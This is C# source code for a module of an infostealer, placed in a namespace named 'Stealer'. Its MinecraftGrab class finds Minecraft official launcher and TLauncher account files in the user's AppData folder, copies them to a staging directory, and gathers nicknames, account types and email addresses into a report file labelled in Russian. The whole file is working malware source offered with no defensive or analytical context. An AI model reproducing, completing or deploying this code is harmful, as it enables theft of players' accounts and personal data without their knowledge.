using System;
using System.Collections.Generic;
using System.IO;
using Newtonsoft.Json;

namespace Stealer;

public class MinecraftGrab
{
	public static int count = 0;

	public static int accounts = 0;

	private static bool in_patch = false;

	public static string result = "";

	public static void get()
	{
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\launcher_accounts.json"))
			{
				count++;
				Directory.CreateDirectory(Help.path_stealer + "Minecraft\\Official Launcher");
				string toDir = Help.path_stealer + "Minecraft\\Official Launcher";
				CopyFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\launcher_accounts.json", toDir);
				Dictionary<string, object> dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\launcher_accounts.json"));
				foreach (dynamic item in (dynamic)dictionary["accounts"])
				{
					dynamic val = ((dynamic)dictionary["accounts"])[item.Name];
					string text = val["minecraftProfile"]["name"];
					string text2 = val["type"];
					string text3 = val["username"];
					result = result + "| Ник: " + text + "\n| Тип аккаунта: " + text2 + "\n| Почта: " + text3 + "\n\n";
					accounts++;
				}
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\TlauncherProfiles.json"))
			{
				count++;
				Directory.CreateDirectory(Help.path_stealer + "Minecraft\\TLauncher");
				string toDir2 = Help.path_stealer + "Minecraft\\TLauncher";
				CopyFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\TlauncherProfiles.json", toDir2);
				Dictionary<string, object> dictionary2 = JsonConvert.DeserializeObject<Dictionary<string, object>>(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\TlauncherProfiles.json"));
				foreach (dynamic item2 in (dynamic)dictionary2["authenticationDatabase"])
				{
					dynamic val2 = ((dynamic)dictionary2["authenticationDatabase"])[item2.Name];
					string text4 = val2["displayName"];
					string text5 = val2["type"];
					string text6 = val2["username"];
					result = result + "| Ник: " + text4 + "\n| Тип аккаунта: " + text5 + "\n| Почта: " + text6 + "\n\n";
					accounts++;
				}
			}
			if (result != "")
			{
				File.AppendAllText(Help.path_stealer + "\\Minecraft\\MinecraftInfo.txt", result);
			}
		}
		catch (KeyNotFoundException)
		{
		}
		catch (Exception ex2)
		{
			Handler.error(ex2.ToString());
		}
	}

	private static void CopyFile(string s1, string toDir)
	{
		try
		{
			string fileName = Path.GetFileName(s1);
			if (!in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
			{
				string destFileName = toDir + "\\" + fileName;
				File.Copy(s1, destFileName);
			}
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
		}
	}
}
